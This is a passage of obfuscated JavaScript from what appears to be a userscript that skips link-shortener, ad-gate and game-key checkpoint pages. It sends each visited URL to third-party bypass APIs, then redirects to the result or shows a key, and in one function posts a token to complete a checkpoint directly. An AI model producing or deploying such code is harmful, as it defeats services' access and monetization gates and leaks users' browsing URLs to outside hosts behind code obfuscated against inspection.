_0x624ae5=_0x147b43;console[_0x624ae5(0x213)](_0x624ae5(0x229),_0x14bba2);});},_0x2deffc[_0x59600e(0x1a4)](_0x52dcd8);}if(_0x462fbf){const _0x3aa80d=document[_0x59600e(0x1f4)](_0x59600e(0x226));_0x3aa80d[_0x59600e(0x30e)][_0x59600e(0x2f3)]=_0x59600e(0x236),_0x3aa80d[_0x59600e(0x30e)][_0x59600e(0x187)]=_0x59600e(0x2a9),_0x3aa80d['style'][_0x59600e(0x204)]=_0x59600e(0x2a9);const _0x554ead=document[_0x59600e(0x1f4)](_0x59600e(0x1db));_0x554ead[_0x59600e(0x15c)]=_0x59600e(0x1e5),_0x554ead[_0x59600e(0x30e)][_0x59600e(0x281)]=_0x59600e(0x2a9),_0x554ead[_0x59600e(0x30e)][_0x59600e(0x2ff)]=_0x59600e(0x269),_0x554ead[_0x59600e(0x30e)]['backgroundColor']=_0x59600e(0x237),_0x554ead['style'][_0x59600e(0x1f0)]=_0x59600e(0x2ac),_0x554ead['style'][_0x59600e(0x327)]=_0x59600e(0x1e1),_0x554ead['style'][_0x59600e(0x22c)]='pointer',_0x554ead[_0x59600e(0x2b0)]=async function(){const _0x2b690a=_0x59600e;try{const _0x48307c=encodeURIComponent(_0x45f1f6),_0x4881f3=await fetch(_0x2b690a(0x2b8)+_0x48307c);if(_0x4881f3['ok']){const _0x1b37ef=await _0x4881f3[_0x2b690a(0x21f)](),_0x46cccd=_0x1b37ef[_0x2b690a(0x26c)];window[_0x2b690a(0x31e)][_0x2b690a(0x2bf)]=_0x46cccd;}else console[_0x2b690a(0x213)](_0x2b690a(0x1bb));}catch(_0x4da05a){console[_0x2b690a(0x213)](_0x2b690a(0x2ad),_0x4da05a);}finally{_0x1b0117();}};const _0x37f508=document[_0x59600e(0x1f4)]('button');_0x37f508[_0x59600e(0x15c)]='No',_0x37f508['style'][_0x59600e(0x281)]=_0x59600e(0x2a9),_0x37f508['style'][_0x59600e(0x2ff)]=_0x59600e(0x269),_0x37f508[_0x59600e(0x30e)][_0x59600e(0x1ae)]='#f44336',_0x37f508[_0x59600e(0x30e)][_0x59600e(0x1f0)]=_0x59600e(0x2ac),_0x37f508[_0x59600e(0x30e)][_0x59600e(0x327)]=_0x59600e(0x1e1),_0x37f508['style']['cursor']=_0x59600e(0x21c),_0x37f508[_0x59600e(0x2b0)]=_0x1b0117,_0x3aa80d[_0x59600e(0x1a4)](_0x554ead),_0x3aa80d[_0x59600e(0x1a4)](_0x37f508),_0x2deffc[_0x59600e(0x1a4)](_0x3aa80d);}document[_0x59600e(0x215)]['appendChild'](_0x2deffc);}function _0x1b0117(){const _0x3ede83=_0x166e19,_0x5947f3=document[_0x3ede83(0x2d0)](_0x3ede83(0x294));_0x5947f3&&_0x5947f3[_0x3ede83(0x1ac)]();}try{const _0x3d1d76=0x7d0;await _0x348905(_0x3d1d76);const _0x43b093=encodeURIComponent(_0x45f1f6);let _0x5b1afe=await fetch(_0x166e19(0x2b8)+_0x43b093);if(!_0x5b1afe['ok'])throw new Error('HTTP\x20error!\x20status:\x20'+_0x5b1afe[_0x166e19(0x2a4)]);const _0x10264b=await _0x5b1afe[_0x166e19(0x21f)](),_0x3b69de=_0x10264b[_0x166e19(0x26c)][_0x166e19(0x320)]('\x0a')[0x0][_0x166e19(0x2b9)]();if(_0x1ed98e[_0x166e19(0x27f)](_0x58e4df=>_0x3b69de['startsWith'](_0x58e4df))){console[_0x166e19(0x314)](_0x166e19(0x1cc),_0x3b69de),_0x29f951('Bypass\x20detected,\x20URL\x20has\x20not\x20been\x20bypassed\x20before.\x20Do\x20you\x20want\x20to\x20continue\x20the\x20bypass?',!![]);return;}const _0x4f71bd=['https://keyrblx.com/getkey/',_0x166e19(0x22d),_0x166e19(0x18c)];_0x4f71bd[_0x166e19(0x27f)](_0x5bb188=>_0x3b69de[_0x166e19(0x1ee)](_0x5bb188))&&await _0x348905(0x2710);if(_0x3b69de[_0x166e19(0x1ee)](_0x166e19(0x1b1))||_0x3b69de[_0x166e19(0x1ee)](_0x166e19(0x199)))window[_0x166e19(0x31e)][_0x166e19(0x2bf)]=_0x3b69de;else{if(_0x3b69de)console[_0x166e19(0x1b2)](_0x166e19(0x253)),_0x29f951(_0x166e19(0x2db),![],_0x3b69de);else{console[_0x166e19(0x1b2)](_0x166e19(0x2a3));throw new Error(_0x166e19(0x2de));}}}catch(_0x487392){!_0x5a4f54&&(console[_0x166e19(0x213)]('Error:\x20API\x20might\x20be\x20offline.\x20Do\x20you\x20want\x20to\x20use\x20Bypass.city?',_0x487392),_0x1b0117(),_0x29f951(_0x166e19(0x1a9),!![]),_0x5a4f54=!![]);}}async function paster(){const _0x291cb2=_0x9d0720,_0x1a5f89=window['location']['href'],_0x5ec684=document[_0x291cb2(0x1f4)]('div');_0x5ec684['style']['position']=_0x291cb2(0x16d),_0x5ec684[_0x291cb2(0x30e)]['top']='20px',_0x5ec684[_0x291cb2(0x30e)][_0x291cb2(0x240)]='20px',_0x5ec684[_0x291cb2(0x30e)][_0x291cb2(0x281)]=_0x291cb2(0x2d9),_0x5ec684[_0x291cb2(0x30e)][_0x291cb2(0x1ae)]=_0x291cb2(0x1bc),_0x5ec684[_0x291cb2(0x30e)][_0x291cb2(0x2ff)]=_0x291cb2(0x301),_0x5ec684[_0x291cb2(0x30e)]['borderRadius']='10px',_0x5ec684[_0x291cb2(0x30e)][_0x291cb2(0x2a0)]=_0x291cb2(0x1d8),_0x5ec684[_0x291cb2(0x30e)][_0x291cb2(0x318)]=_0x291cb2(0x206),_0x5ec684[_0x291cb2(0x30e)]['maxWidth']=_0x291cb2(0x1eb),_0x5ec684['style'][_0x291cb2(0x1e2)]=_0x291cb2(0x24f),_0x5ec684[_0x291cb2(0x30e)]['color']=_0x291cb2(0x181),_0x5ec684[_0x291cb2(0x30e)]['wordWrap']=_0x291cb2(0x230),_0x5ec684[_0x291cb2(0x25a)]=_0x291cb2(0x1b9),document[_0x291cb2(0x215)]['appendChild'](_0x5ec684);try{const _0x2e10ec=await fetch(_0x291cb2(0x2b8)+_0x1a5f89),_0x5e8259=await _0x2e10ec['json'](),_0x4fb509=_0x5e8259[_0x291cb2(0x26c)][_0x291cb2(0x32f)](/\\n/g,'')[_0x291cb2(0x32f)](/\bn\b/g,''),_0x21accc=document[_0x291cb2(0x1f4)](_0x291cb2(0x226));_0x21accc[_0x291cb2(0x30e)][_0x291cb2(0x1f5)]=_0x291cb2(0x21a),_0x21accc[_0x291cb2(0x2d8)]=_0x4fb509[_0x291cb2(0x32f)](/(https?:\/\/[^\s]+)/g,_0x291cb2(0x15d)),_0x5ec684['textContent']='',_0x5ec684[_0x291cb2(0x1a4)](_0x21accc);const _0x3f0f6a=document[_0x291cb2(0x1f4)](_0x291cb2(0x1db));_0x3f0f6a[_0x291cb2(0x25a)]=_0x291cb2(0x1a5),_0x3f0f6a['style'][_0x291cb2(0x204)]=_0x291cb2(0x2a9),_0x3f0f6a['style'][_0x291cb2(0x23a)]=_0x291cb2(0x2a9),_0x3f0f6a[_0x291cb2(0x30e)][_0x291cb2(0x281)]=_0x291cb2(0x2b5),_0x3f0f6a[_0x291cb2(0x30e)][_0x291cb2(0x1ae)]=_0x291cb2(0x1a6),_0x3f0f6a[_0x291cb2(0x30e)][_0x291cb2(0x1f0)]=_0x291cb2(0x2ac),_0x3f0f6a[_0x291cb2(0x30e)][_0x291cb2(0x2ff)]='none',_0x3f0f6a[_0x291cb2(0x30e)]['borderRadius']=_0x291cb2(0x1e1),_0x3f0f6a['style']['cursor']=_0x291cb2(0x21c),_0x3f0f6a['addEventListener'](_0x291cb2(0x182),()=>{const _0x5cf4c9=_0x291cb2;navigator[_0x5cf4c9(0x1af)]['writeText'](_0x4fb509)[_0x5cf4c9(0x2e2)](()=>{const _0x5d1b03=_0x5cf4c9;alert(_0x5d1b03(0x255));})[_0x5cf4c9(0x1f2)](_0x28d524=>{const _0x33ca3f=_0x5cf4c9;console[_0x33ca3f(0x213)](_0x33ca3f(0x225),_0x28d524);});}),_0x5ec684[_0x291cb2(0x1a4)](_0x3f0f6a);const _0x4b650c=document[_0x291cb2(0x1f4)](_0x291cb2(0x1db));_0x4b650c[_0x291cb2(0x25a)]=_0x291cb2(0x2ce),_0x4b650c[_0x291cb2(0x30e)][_0x291cb2(0x204)]=_0x291cb2(0x2a9),_0x4b650c['style'][_0x291cb2(0x281)]=_0x291cb2(0x2b5),_0x4b650c[_0x291cb2(0x30e)][_0x291cb2(0x1ae)]=_0x291cb2(0x270),_0x4b650c['style'][_0x291cb2(0x1f0)]=_0x291cb2(0x2ac),_0x4b650c[_0x291cb2(0x30e)]['border']=_0x291cb2(0x269),_0x4b650c[_0x291cb2(0x30e)][_0x291cb2(0x327)]=_0x291cb2(0x1e1),_0x4b650c[_0x291cb2(0x30e)][_0x291cb2(0x22c)]=_0x291cb2(0x21c),_0x4b650c[_0x291cb2(0x161)](_0x291cb2(0x182),()=>{const _0x53fedd=_0x291cb2;document['body'][_0x53fedd(0x296)](_0x5ec684);}),_0x5ec684[_0x291cb2(0x1a4)](_0x4b650c);}catch(_0x36d618){_0x5ec684[_0x291cb2(0x25a)]='Error\x20fetching\x20data',console[_0x291cb2(0x213)](_0x36d618);}}async function workink(){const _0x4e7a14=_0x9d0720,_0x37bab4=_0x395d95=>new Promise(_0x2be1da=>setTimeout(_0x2be1da,_0x395d95)),_0x5a867a=window['location'][_0x4e7a14(0x2bf)];function _0x311c19(_0x5a6131,_0x3f441d=null){const _0x1cc0dc=_0x4e7a14,_0x49beff=document[_0x1cc0dc(0x1f4)](_0x1cc0dc(0x226));_0x49beff['id']=_0x1cc0dc(0x294),_0x49beff[_0x1cc0dc(0x30e)]['position']=_0x1cc0dc(0x16d),_0x49beff[_0x1cc0dc(0x30e)]['bottom']=_0x1cc0dc(0x2d9),_0x49beff['style'][_0x1cc0dc(0x277)]=_0x1cc0dc(0x2d9),_0x49beff['style']['zIndex']='1000',_0x49beff[_0x1cc0dc(0x30e)][_0x1cc0dc(0x2f3)]=_0x1cc0dc(0x236),_0x49beff[_0x1cc0dc(0x30e)][_0x1cc0dc(0x244)]='center',_0x49beff[_0x1cc0dc(0x30e)]['justifyContent']=_0x1cc0dc(0x202),_0x49beff[_0x1cc0dc(0x30e)][_0x1cc0dc(0x2fd)]=_0x1cc0dc(0x19b),_0x49beff[_0x1cc0dc(0x30e)]['backgroundColor']=_0x1cc0dc(0x1cd),_0x49beff['style'][_0x1cc0dc(0x281)]=_0x1cc0dc(0x2d9),_0x49beff['style']['borderRadius']=_0x1cc0dc(0x2a9),_0x49beff['style']['color']=_0x1cc0dc(0x2ac);const _0x3ed55a=document[_0x1cc0dc(0x1f4)](_0x1cc0dc(0x226));_0x3ed55a['id']=_0x1cc0dc(0x2a1),_0x3ed55a[_0x1cc0dc(0x15c)]=_0x5a6131,_0x49beff[_0x1cc0dc(0x1a4)](_0x3ed55a);if(_0x3f441d){const _0x50961e=document[_0x1cc0dc(0x1f4)]('div');_0x50961e['style'][_0x1cc0dc(0x204)]=_0x1cc0dc(0x2a9),_0x50961e[_0x1cc0dc(0x30e)][_0x1cc0dc(0x1a2)]=_0x1cc0dc(0x1e7),_0x50961e[_0x1cc0dc(0x30e)][_0x1cc0dc(0x261)]='bold',_0x50961e[_0x1cc0dc(0x15c)]=''+_0x3f441d,_0x49beff[_0x1cc0dc(0x1a4)](_0x50961e);const _0x233d45=document[_0x1cc0dc(0x1f4)](_0x1cc0dc(0x1db));_0x233d45[_0x1cc0dc(0x15c)]=_0x1cc0dc(0x166),_0x233d45[_0x1cc0dc(0x30e)]['marginTop']='10px',_0x233d45[_0x1cc0dc(0x30e)]['padding']='10px',_0x233d45[_0x1cc0dc(0x30e)][_0x1cc0dc(0x2ff)]=_0x1cc0dc(0x269),_0x233d45[_0x1cc0dc(0x30e)][_0x1cc0dc(0x1ae)]='#008CBA',_0x233d45[_0x1cc0dc(0x30e)]['color']='white',_0x233d45[_0x1cc0dc(0x30e)][_0x1cc0dc(0x327)]='5px',_0x233d45[_0x1cc0dc(0x30e)][_0x1cc0dc(0x22c)]='pointer',_0x233d45[_0x1cc0dc(0x2b0)]=function(){const _0x5db6cc=_0x1cc0dc;navigator[_0x5db6cc(0x1af)][_0x5db6cc(0x273)](_0x3f441d)[_0x5db6cc(0x2e2)](()=>{const _0x185cdf=_0x5db6cc;alert('Key\x20copied\x20to\x20clipboard'),_0x233d45[_0x185cdf(0x15c)]=_0x185cdf(0x1c0),setTimeout(()=>{const _0x39849b=_0x185cdf;_0x233d45[_0x39849b(0x15c)]='Copy';},0x7d0);})['catch'](_0x523287=>{const _0x46681c=_0x5db6cc;console[_0x46681c(0x213)]('Error\x20copying\x20key\x20to\x20clipboard',_0x523287);});},_0x49beff[_0x1cc0dc(0x1a4)](_0x233d45);}document[_0x1cc0dc(0x215)][_0x1cc0dc(0x1a4)](_0x49beff);}function _0x1b8413(){const _0x400509=_0x4e7a14,_0x49bccc=document['getElementById'](_0x400509(0x294));_0x49bccc&&_0x49bccc[_0x400509(0x1ac)]();}try{console['log'](_0x4e7a14(0x18e),_0x5a867a),await _0x37bab4(0x7d0),console[_0x4e7a14(0x314)](_0x4e7a14(0x209));let _0x2cad27=await fetch(_0x4e7a14(0x2b8)+_0x5a867a);if(!_0x2cad27['ok']){console[_0x4e7a14(0x213)](_0x4e7a14(0x194)+_0x2cad27[_0x4e7a14(0x2a4)]);throw new Error(_0x4e7a14(0x194)+_0x2cad27[_0x4e7a14(0x2a4)]);}console[_0x4e7a14(0x314)](_0x4e7a14(0x334));const _0x4ba4c7=await _0x2cad27['json']();console['log'](_0x4e7a14(0x247),_0x4ba4c7);if(_0x4ba4c7[_0x4e7a14(0x26c)]===_0x4e7a14(0x32b)){_0x311c19(_0x4e7a14(0x16a));return;}if(_0x4ba4c7[_0x4e7a14(0x26c)]&&_0x4ba4c7[_0x4e7a14(0x26c)][_0x4e7a14(0x1ee)](_0x4e7a14(0x1b1)))console['log'](_0x4e7a14(0x23e),_0x4ba4c7[_0x4e7a14(0x26c)]),window['location']['href']=_0x4ba4c7[_0x4e7a14(0x26c)];else{if(_0x4ba4c7[_0x4e7a14(0x26c)]){let _0x4bab2f=decodeURIComponent(_0x4ba4c7[_0x4e7a14(0x26c)]);_0x4bab2f[_0x4e7a14(0x1ee)](_0x4e7a14(0x1b1))?(console[_0x4e7a14(0x314)](_0x4e7a14(0x1d0),_0x4bab2f),window[_0x4e7a14(0x31e)][_0x4e7a14(0x2bf)]=_0x4bab2f):(console[_0x4e7a14(0x1b2)](_0x4e7a14(0x1bd)),_0x311c19(_0x4e7a14(0x26b),_0x4ba4c7[_0x4e7a14(0x26c)]));}else{console[_0x4e7a14(0x1b2)]('First\x20API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20key.');throw new Error(_0x4e7a14(0x2cb));}}}catch(_0x4578e7){console[_0x4e7a14(0x213)]('Error:\x20API\x20might\x20be\x20offline\x20or\x20returned\x20an\x20invalid\x20response.',_0x4578e7),await notification_failed();}}async function bstlar(){const _0x5e7071=_0x9d0720,_0x58dbd1=_0x2fa39e=>new Promise(_0x3b9130=>setTimeout(_0x3b9130,_0x2fa39e)),_0x1c862d=window[_0x5e7071(0x31e)][_0x5e7071(0x2bf)];function _0x1d8f21(_0x2e56df,_0x42085c=null){const _0x56b387=_0x5e7071,_0x26f3a9=document[_0x56b387(0x1f4)]('div');_0x26f3a9['id']=_0x56b387(0x294),_0x26f3a9[_0x56b387(0x30e)][_0x56b387(0x336)]='fixed',_0x26f3a9['style'][_0x56b387(0x1c6)]=_0x56b387(0x2d9),_0x26f3a9[_0x56b387(0x30e)][_0x56b387(0x277)]=_0x56b387(0x2d9),_0x26f3a9['style']['zIndex']=_0x56b387(0x206),_0x26f3a9[_0x56b387(0x30e)]['display']='flex',_0x26f3a9[_0x56b387(0x30e)][_0x56b387(0x244)]='center',_0x26f3a9['style'][_0x56b387(0x1e9)]=_0x56b387(0x202),_0x26f3a9['style']['flexDirection']=_0x56b387(0x19b),_0x26f3a9['style'][_0x56b387(0x1ae)]=_0x56b387(0x1cd),_0x26f3a9[_0x56b387(0x30e)]['padding']=_0x56b387(0x2d9),_0x26f3a9['style'][_0x56b387(0x327)]='10px',_0x26f3a9['style'][_0x56b387(0x1f0)]=_0x56b387(0x2ac);const _0x1b0048=document['createElement'](_0x56b387(0x226));_0x1b0048['id']=_0x56b387(0x2a1),_0x1b0048[_0x56b387(0x15c)]=_0x2e56df,_0x26f3a9[_0x56b387(0x1a4)](_0x1b0048);if(_0x42085c){const _0x472098=document[_0x56b387(0x1f4)](_0x56b387(0x226));_0x472098['style'][_0x56b387(0x204)]='10px',_0x472098[_0x56b387(0x30e)][_0x56b387(0x1a2)]=_0x56b387(0x1e7),_0x472098[_0x56b387(0x30e)][_0x56b387(0x261)]=_0x56b387(0x242),_0x472098[_0x56b387(0x15c)]=''+_0x42085c,_0x26f3a9[_0x56b387(0x1a4)](_0x472098);const _0x2cf769=document[_0x56b387(0x1f4)](_0x56b387(0x1db));_0x2cf769[_0x56b387(0x15c)]='Copy',_0x2cf769[_0x56b387(0x30e)]['marginTop']=_0x56b387(0x2a9),_0x2cf769[_0x56b387(0x30e)][_0x56b387(0x281)]='10px',_0x2cf769[_0x56b387(0x30e)][_0x56b387(0x2ff)]=_0x56b387(0x269),_0x2cf769[_0x56b387(0x30e)][_0x56b387(0x1ae)]=_0x56b387(0x237),_0x2cf769[_0x56b387(0x30e)][_0x56b387(0x1f0)]=_0x56b387(0x2ac),_0x2cf769[_0x56b387(0x30e)][_0x56b387(0x327)]=_0x56b387(0x1e1),_0x2cf769['style'][_0x56b387(0x22c)]=_0x56b387(0x21c),_0x2cf769['onclick']=function(){const _0x53b0e9=_0x56b387;navigator[_0x53b0e9(0x1af)][_0x53b0e9(0x273)](_0x42085c)[_0x53b0e9(0x2e2)](()=>{const _0x28c745=_0x53b0e9;alert(_0x28c745(0x2cc)),_0x2cf769['innerText']=_0x28c745(0x1c0),setTimeout(()=>{const _0x3935e2=_0x28c745;_0x2cf769[_0x3935e2(0x15c)]=_0x3935e2(0x166);},0x7d0);})[_0x53b0e9(0x1f2)](_0x48780b=>{const _0x1363ce=_0x53b0e9;console[_0x1363ce(0x213)]('Error\x20copying\x20key\x20to\x20clipboard',_0x48780b);});},_0x26f3a9[_0x56b387(0x1a4)](_0x2cf769);}document[_0x56b387(0x215)]['appendChild'](_0x26f3a9);}function _0x52f3f0(){const _0x39957f=_0x5e7071,_0xe49231=document[_0x39957f(0x2d0)]('notification-container');_0xe49231&&_0xe49231[_0x39957f(0x1ac)]();}try{console[_0x5e7071(0x314)](_0x5e7071(0x18e),_0x1c862d),await _0x58dbd1(0x7d0),console['log']('Sending\x20request\x20to\x20API...');let _0x23340a=await fetch('https://api.bypass.vip/bypass?url='+_0x1c862d);if(!_0x23340a['ok']){console[_0x5e7071(0x213)]('HTTP\x20error!\x20status:\x20'+_0x23340a[_0x5e7071(0x2a4)]);throw new Error(_0x5e7071(0x194)+_0x23340a[_0x5e7071(0x2a4)]);}console[_0x5e7071(0x314)]('API\x20responded,\x20parsing\x20JSON...');const _0x386230=await _0x23340a[_0x5e7071(0x21f)]();console['log'](_0x5e7071(0x247),_0x386230);if(_0x386230[_0x5e7071(0x26c)]&&_0x386230[_0x5e7071(0x26c)][_0x5e7071(0x1ee)](_0x5e7071(0x1b1)))console[_0x5e7071(0x314)](_0x5e7071(0x23e),_0x386230['result']),window[_0x5e7071(0x31e)][_0x5e7071(0x2bf)]=_0x386230[_0x5e7071(0x26c)];else{if(_0x386230[_0x5e7071(0x26c)]){let _0x33b79a=decodeURIComponent(_0x386230[_0x5e7071(0x26c)]);_0x33b79a[_0x5e7071(0x1ee)](_0x5e7071(0x1b1))?(console[_0x5e7071(0x314)](_0x5e7071(0x1d0),_0x33b79a),window[_0x5e7071(0x31e)][_0x5e7071(0x2bf)]=_0x33b79a):(console[_0x5e7071(0x1b2)](_0x5e7071(0x1bd)),_0x1d8f21(_0x5e7071(0x26b),_0x386230['result']));}else{console[_0x5e7071(0x1b2)](_0x5e7071(0x2cf));throw new Error('First\x20API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20key');}}}catch(_0x3e0f89){console[_0x5e7071(0x213)](_0x5e7071(0x1b7),_0x3e0f89),await notification_failed();}}async function lootlabs(){const _0x6c43ba=_0x9d0720,_0x40c810=_0xffe762=>new Promise(_0x56a4ac=>setTimeout(_0x56a4ac,_0xffe762)),_0x996a17=window[_0x6c43ba(0x31e)][_0x6c43ba(0x2bf)];if(_0x996a17['startsWith']('https://loot-link.com/s?fJjn&r=')||_0x996a17['startsWith']('https://loot-link.com/s?812c32a9&r=')){console[_0x6c43ba(0x314)]('Detected\x20loot-link\x20URL,\x20using\x20backup\x20function\x20to\x20bypass.'),await lootlabsBackup();return;}try{console['log'](_0x6c43ba(0x18e),_0x996a17),await _0x40c810(0x7d0),console['log'](_0x6c43ba(0x2f7));let _0xa46541=await fetch(_0x6c43ba(0x2b8)+_0x996a17);if(!_0xa46541['ok']){console[_0x6c43ba(0x213)](_0x6c43ba(0x194)+_0xa46541[_0x6c43ba(0x2a4)]);throw new Error(_0x6c43ba(0x194)+_0xa46541[_0x6c43ba(0x2a4)]);}console[_0x6c43ba(0x314)](_0x6c43ba(0x165));let _0x409c83=await _0xa46541[_0x6c43ba(0x21f)]();console[_0x6c43ba(0x314)](_0x6c43ba(0x247),_0x409c83);if(_0x409c83[_0x6c43ba(0x2a4)]==='success'&&_0x409c83[_0x6c43ba(0x26c)]&&_0x409c83['result'][_0x6c43ba(0x1ee)](_0x6c43ba(0x1b1))){_0x409c83[_0x6c43ba(0x26c)][_0x6c43ba(0x1ee)](_0x6c43ba(0x235))&&(console[_0x6c43ba(0x314)](_0x6c43ba(0x299)),await _0x40c810(0x2710));if(!_0x409c83[_0x6c43ba(0x26c)][_0x6c43ba(0x26e)](_0x6c43ba(0x31d))){console[_0x6c43ba(0x314)](_0x6c43ba(0x1be),_0x409c83[_0x6c43ba(0x26c)]),window[_0x6c43ba(0x31e)]['href']=_0x409c83[_0x6c43ba(0x26c)];return;}}else{console[_0x6c43ba(0x1b2)](_0x6c43ba(0x24b));throw new Error(_0x6c43ba(0x196));}}catch(_0x420491){console[_0x6c43ba(0x213)](_0x6c43ba(0x22b),_0x420491),console[_0x6c43ba(0x314)](_0x6c43ba(0x1cf));try{let _0x496e59=await fetch('https://dlr.kys.gay/api/free/bypass?url='+_0x996a17);if(!_0x496e59['ok']){console[_0x6c43ba(0x213)](_0x6c43ba(0x194)+_0x496e59[_0x6c43ba(0x2a4)]);throw new Error(_0x6c43ba(0x194)+_0x496e59[_0x6c43ba(0x2a4)]);}console[_0x6c43ba(0x314)](_0x6c43ba(0x311));let _0x11daa2=await _0x496e59['json']();console[_0x6c43ba(0x314)](_0x6c43ba(0x20d),_0x11daa2);if(_0x11daa2[_0x6c43ba(0x26c)]&&_0x11daa2[_0x6c43ba(0x26c)][_0x6c43ba(0x1ee)]('https://')){_0x11daa2[_0x6c43ba(0x26c)][_0x6c43ba(0x1ee)]('https://keyrblx.com/getkey/')&&(console['log'](_0x6c43ba(0x257)),await _0x40c810(0x2710));if(!_0x11daa2[_0x6c43ba(0x26c)]['includes']('lootdest.com'))console[_0x6c43ba(0x314)](_0x6c43ba(0x304),_0x11daa2[_0x6c43ba(0x26c)]),window[_0x6c43ba(0x31e)][_0x6c43ba(0x2bf)]=_0x11daa2[_0x6c43ba(0x26c)];else{console[_0x6c43ba(0x1b2)](_0x6c43ba(0x25e));throw new Error('Fallback\x20API\x20response\x20doesn\x27t\x20contain\x20a\x20valid\x20URL\x20or\x20URL\x20is\x20detected');}}}catch(_0x39b192){console[_0x6c43ba(0x213)](_0x6c43ba(0x2a8),_0x39b192),await notification_failed();}}}async function lootlabsBackup(){const _0x19a4e9=_0x9d0720,_0x5babf4=window['location'][_0x19a4e9(0x2bf)];function _0x4912f2(_0xd53ea0){const _0x2ed197=_0x19a4e9;try{if(typeof _0xd53ea0!==_0x2ed197(0x1d3)||_0xd53ea0['length']===0x0)return![];const _0x113adb=/^[A-Za-z0-9+/=]+$/;if(!_0x113adb[_0x2ed197(0x2c2)](_0xd53ea0))return![];const _0x4617c2=atob(_0xd53ea0);return btoa(_0x4617c2)===_0xd53ea0;}catch(_0x40e26){return![];}}function _0x31d6d7(_0x2db187){const _0x5d42fe=_0x19a4e9,_0x57fa80=new URLSearchParams(window[_0x5d42fe(0x31e)][_0x5d42fe(0x1dd)]);return _0x57fa80[_0x5d42fe(0x1aa)](_0x2db187);}const _0x1681d1=![],_0x22ab54=_0x31d6d7('r');if(_0x22ab54&&_0x4912f2(_0x22ab54))try{const _0x1ed4e7=atob(_0x22ab54);window[_0x19a4e9(0x31e)][_0x19a4e9(0x2bf)]=_0x1ed4e7;}catch(_0x5a30d0){console['error'](_0x19a4e9(0x25d),_0x5a30d0),await notification_failed();}}async function mboost(){const _0xb84841=_0x9d0720;try{await sleep(0x7d0);const _0x3154b9=await fetch(_0xb84841(0x2b8)+window['location']['href']),_0x82dcc8=await _0x3154b9[_0xb84841(0x21f)]();window[_0xb84841(0x31e)]['href']=_0x82dcc8[_0xb84841(0x26c)];}catch(_0x420864){await notification_failed();}}async function socialwolvez(){const _0xaefd46=_0x9d0720;try{await sleep(0x7d0);const _0x2570da=await fetch(_0xaefd46(0x2b8)+window[_0xaefd46(0x31e)][_0xaefd46(0x2bf)]),_0x4728b3=await _0x2570da[_0xaefd46(0x21f)]();window[_0xaefd46(0x31e)][_0xaefd46(0x2bf)]=_0x4728b3[_0xaefd46(0x26c)];}catch(_0x48628f){await notification_failed();}}async function socialunlock(){const _0x332740=_0x9d0720;try{await sleep(0x7d0);const _0x165dab=await fetch(_0x332740(0x2b8)+window[_0x332740(0x31e)]['href']),_0x454fb8=await _0x165dab[_0x332740(0x21f)]();window[_0x332740(0x31e)][_0x332740(0x2bf)]=_0x454fb8[_0x332740(0x26c)];}catch(_0x377216){await notification_failed();}}async function rekonise(){const _0x4dbf4f=_0x9d0720;let _0x5c4452=jQuery[_0x4dbf4f(0x19a)](),_0x5bfc19=window[_0x4dbf4f(0x31e)]['pathname'],_0x2789f1='https://api.rekonise.com/social-unlocks'+_0x5bfc19+_0x4dbf4f(0x17c);try{let _0x5c7f36=await _0x5c4452[_0x4dbf4f(0x222)](_0x2789f1),_0x2e01a4=_0x5c7f36[_0x4dbf4f(0x2c1)];_0x2e01a4[_0x4dbf4f(0x1ee)]('https://keyrblx.com/getkey/')&&(console[_0x4dbf4f(0x314)](_0x4dbf4f(0x2b6)),await new Promise(_0x4490dd=>setTimeout(_0x4490dd,0x1388))),window[_0x4dbf4f(0x31e)][_0x4dbf4f(0x2bf)]=_0x2e01a4;}catch(_0x19acaf){console[_0x4dbf4f(0x213)](_0x4dbf4f(0x319),_0x19acaf),await notification_failed();}}async function letsboost(){const _0x444d10=_0x9d0720;try{await sleep(0x7d0);const _0x5c90ae=await fetch(_0x444d10(0x28f)+window[_0x444d10(0x31e)][_0x444d10(0x2bf)]),_0x68aacf=await _0x5c90ae[_0x444d10(0x21f)]();window['location']['href']=_0x68aacf[_0x444d10(0x28b)];}catch(_0x481802){await notification_failed();}}async function boostink(){const _0x2a043a=_0x9d0720;try{await sleep(0x7d0);const _0x19baa8=await fetch('https://api.bypass.vip/bypass?url='+window[_0x2a043a(0x31e)]['href']),_0x3bfc22=await _0x19baa8[_0x2a043a(0x21f)]();window[_0x2a043a(0x31e)][_0x2a043a(0x2bf)]=_0x3bfc22[_0x2a043a(0x26c)];}catch(_0x1703e5){await notification_failed();}}async function gateway(){const _0x1ec403=_0x9d0720;let _0x287c81=new URL(window[_0x1ec403(0x31e)][_0x1ec403(0x2bf)])[_0x1ec403(0x2fe)][_0x1ec403(0x320)](_0x1ec403(0x265))[0x1],_0x203f78=_0x287c81[_0x1ec403(0x320)]('?')[0x0],_0x858d8=new URL(window[_0x1ec403(0x31e)][_0x1ec403(0x2bf)])[_0x1ec403(0x2e9)][_0x1ec403(0x1aa)]('id');const _0x381cfc=['8',_0x1ec403(0x2e6),'54658',_0x1ec403(0x283),_0x1ec403(0x2e8),_0x1ec403(0x18d),'2','73213','82662',_0x1ec403(0x297)];function _0x24da6(_0x720361,_0x19d500){const _0x2c7edb=_0x1ec403,_0x185f41={'text':_0x720361,'title':_0x2c7edb(0x2f6),'silent':!![]};if(_0x19d500)_0x185f41['timeout']=_0x19d500;GM_notification(_0x185f41);}if(!_0x381cfc['includes'](_0x203f78)){console['log'](_0x1ec403(0x259)+_0x203f78);return;}let _0x4b6a6b=await(await fetch(_0x1ec403(0x169)+_0x203f78+'/'+_0x858d8))[_0x1ec403(0x21f)]();if(_0x4b6a6b[_0x1ec403(0x1ab)])return;if(_0x4b6a6b['checkpointCount']===0x1){let _0x444972=new URL(window[_0x1ec403(0x31e)]['href'])[_0x1ec403(0x2e9)][_0x1ec403(0x1aa)]('tk');if(_0x444972)await sleep(0xbb8),await(await fetch(_0x1ec403(0x326)+_0x203f78+'/'+_0x858d8+'/'+_0x444972,{'method':_0x1ec403(0x20a)}))[_0x1ec403(0x21f)]()['then'](async _0x427561=>{const _0x56bd9b=_0x1ec403;window['location'][_0x56bd9b(0x1c4)](_0x427561['redirect']);})[_0x1ec403(0x1f2)](_0x163ca1=>{alert(_0x163ca1);});else{let _0x2097bb=_0x4b6a6b[_0x1ec403(0x205)],_0x271d1f=await 